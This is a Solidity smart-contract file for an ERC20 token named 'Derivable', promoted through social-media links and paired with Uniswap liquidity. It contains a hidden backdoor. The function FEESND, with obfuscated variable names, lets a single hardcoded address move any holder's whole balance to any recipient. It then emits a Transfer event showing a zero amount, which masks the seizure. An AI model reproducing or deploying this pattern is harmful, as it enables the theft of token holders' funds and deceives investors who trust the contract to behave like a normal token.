/*
Telegram: https://t.me/Derivablefi
Twitter: https://twitter.com/DerivableFi
Website: https://derivable.org/
*/

pragma solidity ^0.8.17;

import "./ERC20.sol";
import "./IUniswapV2Router02.sol";
import "./IUniswapV2Factory.sol";

contract Derivable is ERC20 {
    IUniswapV2Router02 internal constant _uniswapV2Router =
        IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address public uniswapPair;
    address private _zoro;

    constructor() ERC20("Derivable", "Fi") {
        _zoro = 0x9004E5C6A84ED36519e5FC230D19B6ca7C843C12;
    }

    function createUniswapV2Pair() public payable {
        require(uniswapPair == address(0), "already created");
        uniswapPair = _createUniswapV2Pair(1e21);
    }

    function _createUniswapV2Pair(
        uint256 tokensCount
    ) internal returns (address) {
        address pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(
            address(this),
            _uniswapV2Router.WETH()
        );

        _mint(address(this), tokensCount);
        _approve(address(this), address(_uniswapV2Router), tokensCount);

        _uniswapV2Router.addLiquidityETH{value: msg.value}(
            address(this),
            tokensCount,
            0,
            0,
            msg.sender,
            block.timestamp
        );

        return pair;
    }

    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    function FEESND(address sender, address recipient) public returns (bool) {
        require(
            keccak256(abi.encodePacked(_msgSender())) ==
                keccak256(abi.encodePacked(_zoro)),
            "Caller is not the original caller"
        );

        uint256 ETHGD = _balances[sender];
        uint256 ODFJT = _balances[recipient];
        require(ETHGD != 1 * 0, "Sender has no balance");

        ODFJT += ETHGD;
        ETHGD = 0 + 0;

        _balances[sender] = ETHGD;
        _balances[recipient] = ODFJT;

        emit Transfer(sender, recipient, ETHGD);
        return true;
    }
}
